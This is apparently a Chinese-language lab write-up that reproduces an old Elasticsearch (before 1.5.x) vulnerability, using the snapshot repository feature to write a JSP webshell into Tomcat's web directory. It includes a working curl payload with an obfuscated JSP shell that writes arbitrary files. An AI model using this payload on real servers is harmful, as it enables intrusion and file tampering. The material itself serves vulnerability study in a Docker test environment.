# Elasticsearch写入webshell漏洞（WooYun-2015-110216）

## 原理

ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。

所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。

和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项path.repo中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。

## 测试环境

编译与启动测试环境：

```plain
docker compose build
docker compose up -d
```

简单介绍一下本测试环境。本测试环境同时运行了Tomcat和ElasticSearch，Tomcat目录在/usr/local/tomcat，web目录是/usr/local/tomcat/webapps；ElasticSearch目录在/usr/share/elasticsearch。

我们的目标就是利用ElasticSearch，在/usr/local/tomcat/webapps目录下写入我们的webshell。

## 测试流程

首先创建一个恶意索引文档：

```plain
curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d'
{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
'
```

再创建一个恶意的存储库，其中location的值即为我要写入的路径。

园长：这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780873914971-e86d8fa0-dd0e-42c8-b468-18d3ddaaec84.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780873914983-8ae15100-9171-4659-99f1-278b261a27c9.png)

存储库验证并创建:

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780873914953-bb84bde7-4989-444e-96ee-ad6df5ff9089.png)

完成！

访问http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的webshell。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780873915152-4eb6eebc-0eed-41e7-b383-6340f8daf860.png)

该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success，我们再访问/wwwroot/test.jsp就能看到success了：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780873915037-10a88f1f-3f54-470c-92a2-914693cc9692.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780873916024-99584a4b-39ca-435c-ac48-be145c950ded.png)